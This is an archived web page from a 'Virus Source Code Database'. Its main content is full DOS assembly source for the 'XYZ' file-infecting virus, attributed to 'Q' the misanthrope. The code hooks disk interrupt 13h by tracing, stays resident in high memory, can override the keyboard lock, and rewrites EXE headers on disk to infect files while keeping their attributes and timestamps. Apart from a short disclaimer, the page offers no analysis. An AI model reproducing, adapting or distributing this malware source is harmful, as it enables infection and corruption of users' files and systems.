<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: xyz__asm</title>
<meta name="KEYWORDS" content="xyz_.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for xyz_.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="x_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x_1_asm.php">x_1_asm</a><br>
<a href="x-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x-1_asm.php">x-1_asm</a><br>
<a href="x_2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x_2_asm.php">x_2_asm</a><br>
<a href="x-2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x-2_asm.php">x-2_asm</a><br>
<a href="xa1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xa1__asm.php">xa1__asm</a><br>
<a href="xa1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xa1_asm.php">xa1_asm</a><br>
<a href="x__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x__asm.php">x__asm</a><br>
<a href="x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x_asm.php">x_asm</a><br>
<a href="xboot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xboot_asm.php">xboot_asm</a><br>
<a href="xdx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xdx_asm.php">xdx_asm</a><br>
<a href="xmas_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xmas_pas.php">xmas_pas</a><br>
<a href="xph-1029_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xph-1029_asm.php">xph-1029_asm</a><br>
<a href="xph_1100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xph_1100_asm.php">xph_1100_asm</a><br>
<a href="xph-1100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xph-1100_asm.php">xph-1100_asm</a><br>
<a href="xxx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xxx_asm.php">xxx_asm</a><br>
<a href="xyz__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xyz__asm.php">xyz__asm</a><br>
<a href="xyz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xyz_asm.php">xyz_asm</a><br>
<a href="xyz-v2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xyz-v2_asm.php">xyz-v2_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/z/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/z/index.php'" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

cseg		segment	para	public	'code'
xyz		proc	near
assume		cs:cseg

;-----------------------------------------------------------------------------

;designed by "Q" the misanthrope.

;-----------------------------------------------------------------------------

.186
TRUE		equ	001h
FALSE		equ	000h

;-----------------------------------------------------------------------------

;option                              bytes used

FOIL_KEY_LOCK	equ	TRUE	; 14 bytes
INFECT_ON_WRITE	equ	TRUE	;  8 bytes

;-----------------------------------------------------------------------------

ABORT		equ	002h
ALLOCATE_HMA	equ	04a02h
CLOSE_HANDLE	equ	03e00h
COMMAND_8042	equ	064h
COMMAND_LINE	equ	080h
COM_OFFSET	equ	00100h
CRITICAL_INT	equ	024h
DATA_REGISTER	equ	060h
DENYNONE	equ	040h
DOS_INT		equ	021h
DOS_SET_INT	equ	02500h
EIGHTEEN_BYTES	equ	012h
ENVIRONMENT	equ	02ch
EXEC_PROGRAM	equ	04b00h
EXE_SECTOR_SIZE	equ	004h
EXE_SIGNATURE	equ	'ZM'
FAR_INDEX_CALL	equ	01effh
FILE_ATTRIBUTES	equ	04300h
FILE_DATE_TIME	equ	05700h
FIRST_FCB	equ	05ch
FLUSH_BUFFERS	equ	00d00h
FOUR_BYTES	equ	004h
GET		equ	000h
GET_ERROR_LEVEL	equ	04d00h
GOLD_BUG_PTR	equ	0032ah
HARD_DISK_ONE	equ	081h
HIGH_BYTE	equ	00100h
HMA_SEGMENT	equ	0ffffh
INT_13_VECTOR	equ	0004ch
KEEP_CF_INTACT	equ	002h
MAX_SECTORS	equ	078h
MULTIPLEX_INT	equ	02fh
NEW_EXE_HEADER	equ	00040h
NEW_EXE_OFFSET	equ	018h
NULL		equ	00000h
ONE_BYTE	equ	001h
OPEN_W_HANDLE	equ	03d00h
OVERRIDE_LOCK	equ	04bh
PARAMETER_TABLE	equ	004f1h
PORT_HAS_DATA	equ	002h
READ_A_SECTOR	equ	00201h
READ_ONLY	equ	000h
READ_W_HANDLE	equ	03f00h
REMOVE_NOP	equ	001h
RESIDENT_LENGTH	equ	053h
RESIZE_MEMORY	equ	04a00h
RES_OFFSET	equ	0f900h
SECOND_FCB	equ	06ch
SECTOR_SIZE	equ	00200h
SET		equ	001h
SETVER_SIZE	equ	018h
SHORT_JUMP	equ	0ebh
SINGLE_STEP_BIT	equ	00100h
SIX_BYTES	equ	006h
STATUS_8042	equ	064h
TERMINATE_W_ERR	equ	04c00h
THREE_BYTES	equ	003h
TWENTY_HEX	equ	020h
TWENTY_THREE	equ	017h
TWO_BYTES	equ	002h
UN_SINGLE_STEP	equ	not(SINGLE_STEP_BIT)
VERIFY_2SECTORS	equ	00402h
WRITE_A_SECTOR	equ	00301h
WRITE_COMMAND	equ	060h
WRITE_ONLY	equ	001h
WRITE_W_HANDLE	equ	04000h
XYZ_CODE_IS_AT	equ	00148h

;-----------------------------------------------------------------------------

bios_seg	segment	at 0f000h
		org	00000h
old_int_13_addr	label	word
bios_seg	ends

;-----------------------------------------------------------------------------

		org	COM_OFFSET
com_code:

;-----------------------------------------------------------------------------

		jmp	short alloc_memory
DISPLACEMENT	equ	$

;-----------------------------------------------------------------------------

dummy_exe_head	dw	SIX_BYTES,TWO_BYTES,NULL,TWENTY_HEX,ONE_BYTE,HMA_SEGMENT,NULL,NULL,NULL,NULL,NULL,TWENTY_HEX

;-----------------------------------------------------------------------------

		org	XYZ_CODE_IS_AT

;-----------------------------------------------------------------------------

ax_cx_di_si_cld	proc	near
		mov	di,bx
		add	di,XYZ_CODE_IS_AT-COM_OFFSET
ax_cx_si_cld:	call	set_si
set_si:		pop	si
		sub	si,word ptr (offset set_si)-word ptr (offset ax_cx_di_si_cld)
		mov	cx,COM_OFFSET+SECTOR_SIZE-XYZ_CODE_IS_AT
		xor	ax,ax
		cld
		ret
ax_cx_di_si_cld	endp

;-----------------------------------------------------------------------------

ALLOC_STARTS	equ	$

;-----------------------------------------------------------------------------

alloc_memory	proc	near
		xor	dx,dx
		mov	ds,dx
		mov	ah,high(FLUSH_BUFFERS)
		int	DOS_INT
		mov	bx,SECTOR_SIZE
		dec	dx
		mov	di,dx
		mov	ax,ALLOCATE_HMA
		int	MULTIPLEX_INT
		mov	bx,SIX_BYTES
		cmp	di,dx
		jne	use_ffff_di
		cmp	word ptr ds:[GOLD_BUG_PTR],dx
		mov	di,RES_OFFSET
		jne	find_name
use_ffff_di:	call	ax_cx_si_cld
		rep	movs byte ptr es:[di],cs:[si]
alloc_memory	endp

;-----------------------------------------------------------------------------

		IF	FOIL_KEY_LOCK
disable_lock	proc	near
		mov	al,WRITE_COMMAND
		out	COMMAND_8042,al
get_status:	in	al,STATUS_8042
		test	al,PORT_HAS_DATA
		loopnz	get_status
		mov	al,OVERRIDE_LOCK
		out	DATA_REGISTER,al
disable_lock	endp
		ENDIF

;-----------------------------------------------------------------------------

set_int_13	proc	near
		mov	ax,offset interrupt_one
		xchg	word ptr ds:[bx-TWO_BYTES],ax
		push	ax
		push	word ptr ds:[bx]
		mov	word ptr ds:[bx],cs
		mov	cx,di
		mov	dl,HARD_DISK_ONE
		pushf
		pushf
		pushf
		pop	ax
		or	ah,high(SINGLE_STEP_BIT)
		push	ax
		popf
		cli
		mov	ax,VERIFY_2SECTORS
		dw	FAR_INDEX_CALL,INT_13_VECTOR
		popf
		pop	word ptr ds:[bx]
		pop	word ptr ds:[bx-TWO_BYTES]
set_int_13	endp

;-----------------------------------------------------------------------------

find_name	proc	near
		mov	ds,word ptr cs:[bx+ENVIRONMENT-SIX_BYTES]
look_for_nulls:	inc	bx
		cmp	word ptr ds:[bx-FOUR_BYTES],NULL
		jne	look_for_nulls
find_name	endp

;-----------------------------------------------------------------------------

open_file	proc	near
		push	ds
		push	bx
		mov	dx,bx
		mov	ax,OPEN_W_HANDLE+DENYNONE+READ_ONLY
		call	open_that_file
		mov	dx,offset critical_error
		mov	ax,DOS_SET_INT+CRITICAL_INT
		int	DOS_INT
		mov	dx,offset goto_dos
		mov	cx,dx
		mov	ah,high(READ_W_HANDLE)
		int	DOS_INT
		mov	ah,high(CLOSE_HANDLE)
		int	DOS_INT
		push	cs
		pop	es
		mov	bx,dx
		call	convert_back
		pop	dx
		pop	ds
		jne	now_run_it
		push	ds
		push	dx
		mov	ax,GET+FILE_ATTRIBUTES
		int	DOS_INT
		mov	ax,SET+FILE_ATTRIBUTES
		push	cx
		push	ax
		xor	cx,cx
		int	DOS_INT
		mov	ax,OPEN_W_HANDLE+DENYNONE+WRITE_ONLY
		call	open_that_file
		mov	ax,GET+FILE_DATE_TIME
		push	ax
		int	DOS_INT
		push	cx
		push	dx
		mov	ah,high(WRITE_W_HANDLE)
		mov	dx,offset goto_dos
		mov	cx,SECTOR_SIZE
		int	DOS_INT
erutangis	db	'ZYX'
		inc	ax
		int	DOS_INT
		mov	ah,high(CLOSE_HANDLE)
		int	DOS_INT
signature	db	'XYZ'
		pop	ds
		int	DOS_INT
open_file	endp

;-----------------------------------------------------------------------------

now_run_it	proc	near
		mov	bx,RESIDENT_LENGTH
		mov	ah,high(RESIZE_MEMORY)
		int	DOS_INT
		mov	bx,PARAMETER_TABLE
		mov	si,offset exec_table
		mov	di,bx
		mov	ax,EXEC_PROGRAM
set_table:	scasw
		movs	byte ptr es:[di],cs:[si]
		scasb
		mov	word ptr cs:[di],cs
		je	set_table
		int	DOS_INT
		mov	ah,high(GET_ERROR_LEVEL)
		int	DOS_INT
just_leave:	mov	ah,high(TERMINATE_W_ERR)
now_run_it	endp

;-----------------------------------------------------------------------------

open_that_file	proc	near
		int	DOS_INT
		jc	just_leave
		mov	bx,ax
		push	cs
		pop	ds
		ret
open_that_file	endp

;-----------------------------------------------------------------------------

interrupt_one	proc	far
		cmp	ax,VERIFY_2SECTORS
		jne	interrupt_ret
		push	ds
		pusha
		mov 	bp,sp
		lds	si,dword ptr ss:[bp+EIGHTEEN_BYTES]
		cmp	word ptr ds:[si+ONE_BYTE],FAR_INDEX_CALL
		jne	go_back
		mov	si,word ptr ds:[si+THREE_BYTES]
		cmp	word ptr ds:[si+TWO_BYTES],HMA_SEGMENT
		jne	go_back
		cld
		mov	di,cx
		movsw
		movsw
		sub	di,word ptr (offset far_ptr_addr)-word ptr (offset int_13_entry)
		org	$-REMOVE_NOP
		mov	word ptr ds:[si-FOUR_BYTES],di
		and	byte ptr ss:[bp+TWENTY_THREE],high(UN_SINGLE_STEP)
go_back:	popa
		pop	ds
critical_error:	mov	al,ABORT
interrupt_ret:	iret
interrupt_one	endp

;-----------------------------------------------------------------------------

convert_back	proc	near
		call	ax_cx_di_si_cld
		repe	cmps byte ptr cs:[si],es:[di]
		jne	not_xyz
		mov	word ptr es:[bx],EXE_SIGNATURE
		call	ax_cx_di_si_cld
		rep	stosb
not_xyz:	ret
convert_back	endp

;-----------------------------------------------------------------------------

convert_to	proc	near
		pusha
		stc
		pushf
		cmp	word ptr es:[bx],EXE_SIGNATURE
		jne	not_exe_header
		mov	ax,es:[bx+EXE_SECTOR_SIZE]
		cmp	ax,MAX_SECTORS
		ja	not_exe_header
		cmp	al,SETVER_SIZE
		je	not_exe_header
		cmp	word ptr es:[bx+NEW_EXE_OFFSET],NEW_EXE_HEADER
		jae	not_exe_header
		call	ax_cx_di_si_cld
		pusha
		repe	scasb
		popa
		jne	not_exe_header
		mov	word ptr es:[bx],((ALLOC_STARTS-DISPLACEMENT)*HIGH_BYTE)+SHORT_JUMP
		rep	movs byte ptr es:[di],cs:[si]
		popf
		clc
		pushf
not_exe_header:	popf
		popa
		ret
convert_to	endp

;-----------------------------------------------------------------------------

interrupt_13	proc	far
int_13_entry:	cmp	ah,high(READ_A_SECTOR)
		IF	INFECT_ON_WRITE
		jb	jmp_old_int_13
		cmp	ah,high(VERIFY_2SECTORS)
		ja	jmp_old_int_13
		call	convert_to
		ELSE
		jne	jmp_old_int_13
		ENDIF
		pushf
		push	cs
		call	call_old_int_13
		pushf
		call	convert_to
		pusha
		jc	do_convertback
		mov	ax,WRITE_A_SECTOR
		pushf
		push	cs
		call	call_old_int_13
do_convertback:	call	convert_back
		popa
		popf
		retf	KEEP_CF_INTACT
interrupt_13	endp

;-----------------------------------------------------------------------------

exec_table	db	COMMAND_LINE,FIRST_FCB,SECOND_FCB

;-----------------------------------------------------------------------------

		org	COM_OFFSET+SECTOR_SIZE-TWO_BYTES

;-----------------------------------------------------------------------------

call_old_int_13	proc	near
		cli
jmp_old_int_13:	jmp	far ptr old_int_13_addr
call_old_int_13	endp

;-----------------------------------------------------------------------------

		org	COM_OFFSET+SECTOR_SIZE

;-----------------------------------------------------------------------------

goto_dos	proc	near
		mov	ax,TERMINATE_W_ERR
		nop
far_ptr_addr:	int	DOS_INT
goto_dos	endp

;-----------------------------------------------------------------------------

xyz		endp
cseg		ends
end		com_code

</textarea></td></tr></table></body></html>
